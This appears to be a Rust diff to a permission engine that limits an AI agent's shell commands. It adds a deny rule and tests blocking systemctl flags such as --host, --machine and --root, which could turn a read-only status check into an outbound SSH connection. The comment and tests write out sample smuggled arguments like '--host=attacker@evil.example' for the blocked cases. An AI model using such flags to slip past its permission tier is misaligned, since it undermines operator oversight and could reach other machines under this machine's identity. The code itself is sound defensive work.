@@ -48,6 +48,26 @@ fn deny(command: &str, arg_pattern: &str) -> Rule {
 /// extended to clustered forms such as `-ci0.01`.
 const PING_ABUSE_FLAGS: &str = r"(?:^|\s)-[A-Za-z]*f|--flood|(?:^|\s)-[A-Za-z]*i\s*0*\.\d";
 
+/// systemctl flags that redirect the operation away from the local system.
+/// `--host`/`-H` runs the command against a remote machine over SSH,
+/// `--machine`/`-M` against a local container, and `--root` against an
+/// arbitrary filesystem tree. `--host` in particular turns the `safe`
+/// tier's read-only `systemctl status` into an arbitrary outbound SSH
+/// connection using this machine's identity.
+///
+/// `src/tools/systemctl.rs` already inserts a `--` separator so its own
+/// argv builders cannot be tricked this way, but that only protects the
+/// structured tools. `run_command` reaches `systemctl` straight through the
+/// policy engine, where `status --host=attacker@evil.example sshd` still
+/// matches the `^status` allow pattern. This deny closes that path, the
+/// same way `PING_ABUSE_FLAGS` and `DNF_TRUST_BYPASS_FLAGS` close theirs.
+///
+/// Placed in `safe_rules()`, which `standard_rules()` extends rather than
+/// replaces, so a single rule precedes both the `^status` allow (safe) and
+/// the `^(start|stop|...)` allow (standard) under first-match-wins.
+const SYSTEMCTL_HOST_REDIRECT_FLAGS: &str =
+    r"(?:^|\s)--(?:host|machine|root)|(?:^|\s)-[A-Za-z]*[HM]";
+
 /// Flags that defeat dnf's integrity and repository trust model:
 /// `--nogpgcheck` skips signature verification, `--repofrompath` adds an
 /// attacker-controlled repository for the duration of the transaction, and
@@ -65,6 +85,7 @@ const JOURNALCTL_MUTATION_FLAGS: &str =
 
 fn safe_rules() -> Vec<Rule> {
     vec![
+        deny("systemctl", SYSTEMCTL_HOST_REDIRECT_FLAGS),
         allow("systemctl", Some("^status")),
         allow("systemctl", Some("^is-active")),
         allow("systemctl", Some("^is-enabled")),
@@ -299,6 +320,82 @@ mod tests {
             engine.evaluate("dnf", &["upgrade".into()]),
             Decision::Allowed
         ));
+    }
+
+    #[test]
+    fn both_tiers_deny_systemctl_host_redirection_but_allow_ordinary_use() {
+        // The `--` separator in src/tools/systemctl.rs protects only the
+        // structured tools. These are `run_command`-shaped calls, which
+        // reach the policy engine directly, so the tier rules are the only
+        // thing standing between a `safe`-tier agent and an outbound SSH
+        // connection made with this machine's identity.
+        for tier in [TierName::Safe, TierName::Standard] {
+            let engine = PolicyEngine::new(rules_for_tier(&tier));
+            for denied in [
+                vec![
+                    "status".to_string(),
+                    "--host=attacker@evil.example".to_string(),
+                    "sshd".to_string(),
+                ],
+                vec![
+                    "status".to_string(),
+                    "--machine=somecontainer".to_string(),
+                    "sshd".to_string(),
+                ],
+                vec![
+                    "status".to_string(),
+                    "--root=/mnt/other".to_string(),
+                    "sshd".to_string(),
+                ],
+                vec![
+                    "status".to_string(),
+                    "-H".to_string(),
+                    "attacker@evil.example".to_string(),
+                    "sshd".to_string(),
+                ],
+                vec![
+                    "status".to_string(),
+                    "-M".to_string(),
+                    "somecontainer".to_string(),
+                    "sshd".to_string(),
+                ],
+                vec![
+                    "start".to_string(),
+                    "--host=attacker@evil.example".to_string(),
+                    "sshd".to_string(),
+                ],
+            ] {
+                assert!(
+                    matches!(engine.evaluate("systemctl", &denied), Decision::Denied(_)),
+                    "systemctl {denied:?} should be denied under the {tier:?} tier"
+                );
+            }
+
+            // Ordinary reads stay allowed under both tiers, including the
+            // `--`-separated argv the structured tool actually builds.
+            for allowed in [
+                vec!["status".to_string(), "sshd".to_string()],
+                vec!["status".to_string(), "--".to_string(), "sshd".to_string()],
+            ] {
+                assert!(
+                    matches!(engine.evaluate("systemctl", &allowed), Decision::Allowed),
+                    "systemctl {allowed:?} should be allowed under the {tier:?} tier"
+                );
+            }
+        }
+
+        // Service control is a standard-tier privilege, and it survives the
+        // new deny rule sitting ahead of its allow rule.
+        let standard = PolicyEngine::new(rules_for_tier(&TierName::Standard));
+        for allowed in [
+            vec!["stop".to_string(), "sshd".to_string()],
+            vec!["restart".to_string(), "--".to_string(), "sshd".to_string()],
+        ] {
+            assert!(
+                matches!(standard.evaluate("systemctl", &allowed), Decision::Allowed),
+                "systemctl {allowed:?} should be allowed under the standard tier"
+            );
+        }
     }
 
     #[test]
